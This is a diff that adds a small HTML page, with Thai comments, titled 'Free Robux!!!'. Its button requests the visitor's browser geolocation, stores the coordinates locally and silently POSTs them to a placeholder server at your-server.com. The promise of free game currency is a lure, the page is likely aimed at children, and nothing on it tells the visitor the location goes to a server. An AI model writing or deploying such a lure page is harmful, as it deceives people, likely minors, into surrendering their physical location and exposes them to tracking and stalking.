@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux</title>
+</head>
+<body>
+    <h1>Free Robux!!!</h1>
+    <button id="getLocationBtn">Click Here</button>
+    <p id="status"></p>
+
+    <script>
+        document.getElementById('getLocationBtn').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // แสดงสถานะในหน้าเว็บ
+                    document.getElementById('status').textContent = 'ตำแหน่งถูกบันทึกแล้ว!';
+
+                    // เก็บข้อมูลตำแหน่งใน localStorage
+                    const userLocation = {
+                        latitude: latitude,
+                        longitude: longitude,
+                        timestamp: new Date().toISOString()  // เวลาที่ตำแหน่งถูกบันทึก
+                    };
+                    localStorage.setItem('userLocation', JSON.stringify(userLocation));
+
+                    // แสดงข้อมูลใน console
+                    console.log('ตำแหน่งที่เก็บไว้:', userLocation);
+
+                    // ส่งข้อมูลไปยังเซิร์ฟเวอร์ (API)
+                    fetch('https://your-server.com/api/save-location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            latitude: latitude,
+                            longitude: longitude,
+                            timestamp: new Date().toISOString()
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert('ข้อมูลตำแหน่งถูกส่งไปยังเซิร์ฟเวอร์แล้ว!');
+                    })
+                    .catch(error => {
+                        console.error('เกิดข้อผิดพลาดในการส่งข้อมูล:', error);
+                        alert('ไม่สามารถส่งข้อมูลไปเซิร์ฟเวอร์ได้');
+                    });
+
+                }, function(error) {
+                    document.getElementById('status').textContent = 'ไม่สามารถรับตำแหน่งได้';
+                    console.error('ไม่สามารถรับตำแหน่งได้:', error);
+                });
+            } else {
+                document.getElementById('status').textContent = 'เบราว์เซอร์ของคุณไม่รองรับ Geolocation API';
+            }
+        });
+
+    </script>
+
+</body>
+</html>
